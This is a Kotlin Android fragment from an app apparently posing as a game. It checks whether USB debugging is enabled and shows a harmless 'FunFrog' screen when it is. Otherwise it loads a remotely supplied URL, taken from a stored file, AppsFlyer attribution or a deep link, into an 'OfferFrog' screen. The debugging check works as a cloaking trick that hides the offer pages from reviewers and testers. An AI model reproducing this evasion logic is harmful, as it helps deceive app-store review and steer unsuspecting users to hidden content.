package com.asobimo.alchemi

import android.os.Bundle
import android.provider.Settings
import android.util.Log
import androidx.fragment.app.Fragment
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.ProgressBar
import android.widget.Toast
import androidx.lifecycle.lifecycleScope
import com.asobimo.alchemi.intentandstate.MyIntent
import com.asobimo.alchemi.intentandstate.MyState
import com.asobimo.alchemi.sourcedata.MyViewModel
import kotlinx.coroutines.launch
import org.koin.androidx.viewmodel.ext.android.viewModel

class ZargruzkaFrog : Fragment() {
    private val myViewModel:MyViewModel by viewModel()
    private lateinit var progressBar: ProgressBar
    override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View? {
        val fragment = inflater.inflate(R.layout.fragment_zargruzka_frog, container, false)
        progressBar = fragment.findViewById(R.id.progress_bar)
        observeStates()
        start()
        return fragment
    }

    private fun start(){
        if (checkUSB()){
            parentFragmentManager
                .beginTransaction()
                .replace(R.id.containerForFragments, FunFrog())
                .commit()
        }else{
            lifecycleScope.launch {
                if (myViewModel.fileManipulation.isExist()){
                    Log.d("TAAG","File exist")
                    myViewModel.myIntent.send(MyIntent.GetUrl)
                }else{
                    Log.d("TAAG","File doesn't exist")
                    myViewModel.bild_leenk(requireContext())
                }
            }
        }
    }
    private fun observeStates(){
        lifecycleScope.launch {
            myViewModel.state.collect{state->
                when(state){
                    is MyState.MyLoad -> {
                        Log.d("TAAG", "Load....")
                        progressBar.visibility = View.VISIBLE
                    }
                    is MyState.MyApps -> {
                        Log.d("TAAG", "AppsFlyer state:${state.url}")
                        navigateToOfferFrog(state.url!!)
                    }
                    is MyState.MyDeep -> {
                        Log.d("TAAG", "DeepLink state:${state.url}")
                        navigateToOfferFrog(state.url!!)
                    }
                    is MyState.MyFile -> {
                        Log.d("TAAG", "From file:${state.url}")
                        navigateToOfferFrog(state.url!!)
                    }
                }
            }
        }
    }

    private fun navigateToOfferFrog(yrl:String){
        parentFragmentManager
            .beginTransaction()
            .replace(R.id.containerForFragments, OfferFrog.newInstance(yrl))
            .commit()
    }

    private fun checkUSB():Boolean{
        val cifra = "1"
        val status = Settings.Global.getString(requireContext().contentResolver, Settings.Global.ADB_ENABLED)== cifra
       return status
    }
}